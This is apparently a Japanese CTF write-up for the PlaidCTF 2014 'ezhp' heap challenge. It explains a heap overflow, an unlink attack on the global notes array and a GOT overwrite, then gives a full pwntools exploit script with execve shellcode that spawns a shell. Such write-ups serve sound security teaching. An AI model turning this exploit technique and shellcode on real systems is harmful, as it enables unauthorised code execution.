---
layout: post
redirect_from:
  - /writeup/ctf/2014/plaidctf-2014-ezhp/
  - /blog/2016/08/17/plaidctf-2014-ezhp/
date: "2016-08-17T00:43:10+09:00"
tags: [ "writeup", "ctf", "pwn", "heap", "plaidctf" ]
"target_url": [ "https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/ezhp" ]
---

# PlaidCTF 2014 ezhp

heap問のrevは疲れる。
キャンプの夜の短い自由時間に挑んだのだが、それで解くのは私には厳しかったので後から時間で殴った。

## solution

heap上の単なる文字列として表現されるノートを作成/修正/削除/表示できるプログラム。
簡易な独自実装heapを持ち、heap上buffer overflowの脆弱性がある。
ノートの修正でbuffer overflowさせ、ノートの削除でheap unlink attackして適当にどこかを書き換え、GOT overwriteなりでshellcodeを踏めばよい。


strippedなのでrevする。
問題となるのは`0x8048708 <myfree>`だけであるので、`0x804858b <myalloc>`の側はあまり読まなくてよい。
簡易な実装ではあるが双方向連結listの操作は通常通りであり、

``` c
    if (bk) bk->fd = fd;
    if (fd) fd->bk = bk;
```

は(chunkの大きさによらず)行われているので、これを用いて適当な領域への書き込みを行う。
global変数として存在するノートの配列`char *g_notes[]`あたりを書き換えてしまえば、あとはノートの修正部分で楽にshellが取れる。RELROもNX bitもない。

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
context.log_level = 'debug'

g_notes  = 0x804a060 # char *g_notes[]
puts_got = 0x804a008

# http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

p = process('./ezhp')

def add_note(size):
    p.recvuntil('Please choose an option.')
    p.sendline('1') # add a note
    p.recvuntil('Please give me a size.')
    p.sendline(str(size))

def remove_note(id):
    p.recvuntil('Please choose an option.')
    p.sendline('2') # remove a note
    p.recvuntil('Please give me an id.')
    p.sendline(str(id))

def change_note(id, data):
    p.recvuntil('Please choose an option.')
    p.sendline('3') # change a note
    p.recvuntil('Please give me an id.')
    p.sendline(str(id))
    p.recvuntil('Please give me a size.')
    p.sendline(str(len(data)))
    p.recvuntil('Please input your data.')
    p.send(data)

# make notes
add_note(11) # 0
add_note(11) # 1
add_note(11) # 2

# send payload to heap
payload = ''
payload += 'AAAA' # heap + 0x18
payload += 'AAAA'
payload += 'AAA\0'
payload += p32(0x19)
payload += p32(0xaaaaaaaa) # p32(heap + 0x3c)
payload += p32(0xbbbbbbbb) # p32(heap + 0x0c)
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(0x19)
payload += p32(g_notes) # p32(heap + 0x54)
payload += p32(g_notes - 4) # p32(heap + 0x24)
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(0x3b8)
payload += p32(0)
payload += p32(0xcccccccc) # p32(heap + 0x3c)
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(0)
change_note(0, payload)

# write &g_notes[0] into g_notes[0]
remove_note(2)

# rewrite g_notes entries
payload = ''
payload += p32(g_notes)
payload += p32(puts_got)
payload += shellcode
change_note(0, payload)

# jump to the shellcode
change_note(1, p32(g_notes + 8))

time.sleep(1)
p.sendline('id')
p.interactive()
```
